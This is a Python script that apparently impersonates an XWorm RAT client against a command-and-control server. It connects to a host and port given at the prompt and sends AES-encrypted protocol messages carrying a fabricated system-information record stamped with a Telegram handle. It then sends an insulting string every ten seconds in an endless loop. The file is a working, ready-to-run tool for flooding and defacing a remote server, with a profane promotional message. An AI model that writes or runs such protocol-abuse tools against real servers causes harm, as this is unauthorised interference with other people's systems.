
from Crypto.Util.Padding import pad
from Crypto.Cipher import AES
import hashlib
import socket
import time
import os

class FloodUserUtils:
    def aes_encryptor(input_bytes, key):
        key_hash = hashlib.md5(key.encode('utf-8')).digest() # MD5 hash of the key
        cipher = AES.new(key_hash, AES.MODE_ECB) # AES cipher in ECB mode
        padded = pad(input_bytes, AES.block_size) # Pad input to block size
        return cipher.encrypt(padded) # Return encrypted bytes

    def send_encrypted(sock, text: str, key: str): 
        encrypted = FloodUserUtils.aes_encryptor(text.encode(), key) # Encrypt the text
        header = (str(len(encrypted)) + "\0").encode() # Create header with length
        sock.sendall(header + encrypted) # Send header and encrypted data

class FloodUser:
    SPL_XCLIENT = "<Xwormmm>"

    @staticmethod
    def main():
        host = input("Host > ") # Get target host
        port = input("Port > ") # Get target port
        key = input("Key > ") # Get encryption key
        sock = FloodUser.connection(host, port) # Connect to target
        FloodUser.trigger(sock, key) # Trigger the Informations


    def connection(host, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create socket
            sock.connect((host, int(port))) # Connect to target
            print("Connected.") 
            return sock # Return the socket
        except Exception as e:
            print(f"Connection failed: {e}")
            os._exit(0) # Exit on failure

    def trigger(sock, key):
        try:
            strings_info = []

            strings_info.append("UserName : " + "User Name" + "-=>")
            strings_info.append("PCName : " + "PC Name" + "-=>")
            strings_info.append("OS : " + "Operating System" + "-=>")
            strings_info.append("Client : " + "Client" + "-=>")
            strings_info.append("Process : " + "Process Name" + "-=>")
            strings_info.append("DateTime : " + "Date and Time" + "-=>")
            strings_info.append("ListDrivers : " + "List of Drivers" + "-=>")
            strings_info.append("HDDSerial : " + "HDD Serial" + "-=>")                                   
            strings_info.append("GPU : " + "GPU Name" + "-=>")
            strings_info.append("CPU : " + "CPU Name" + "-=>")
            strings_info.append("Identifier : " + "Identifier" + "-=>")
            strings_info.append("Ram : " + "RAM Size" + "-=>")
            strings_info.append("BIOSVersion : " + "BIOS Version" + "-=>")
            strings_info.append("BIOSReleaseDate : " + "BIOS Release Date" + "-=>")   
            strings_info.append("SystemProductName : " + "System Product Name" + "-=>")
            strings_info.append("MachineType : " + "Machine Type" + "-=>")
            strings_info.append("LastReboot : " + "Last Reboot" + "-=>")
            strings_info.append("Antivirus : " + "Antivirus Name" + "-=>")                                    
            strings_info.append("Firewall : " + "Firewall Name" + "-=>")      
            strings_info.append("MacAddress : " + "MAC Address" + "-=>")
            strings_info.append("DefaultBrowser : " + "Default Browser" + "-=>")
            strings_info.append("CurrentLang : " + "Current Language" + "-=>")
            strings_info.append("Platform : " + "Platform" + "-=>")
            strings_info.append("Ver : " + "Version" + "-=>")
            strings_info.append(".Net : " + ".Net Version" + "-=>")  
            strings_info.append("Battery : " + "Battery Status" + " | t.me/swezy") 

            payload =  f"Informations{FloodUser.SPL_XCLIENT}ClientID" 
            FloodUserUtils.send_encrypted(sock, payload, key) # Send encrypted message

            if isinstance(strings_info, list): # Check if strings_info is a list
                for item in strings_info: # Iterate through each item
                    if item.lower().startswith("username : "): # Check for username
                        system_info_string = ''.join(strings_info) # Join list into a single string
                        payload = f"GetInformations{FloodUser.SPL_XCLIENT}ClientID{FloodUser.SPL_XCLIENT}{system_info_string}" # Create payload
                        FloodUserUtils.send_encrypted(sock, payload, key) # Send encrypted message
                        print("Info sent.")
                        while True:
                            sock.sendall(b'Get fucked by t.me/swezy') # Keep the connection alive
                            time.sleep(10)

        except Exception as e:
            print(f"Failed to send message: {e}")

if __name__ == "__main__":
    FloodUser.main()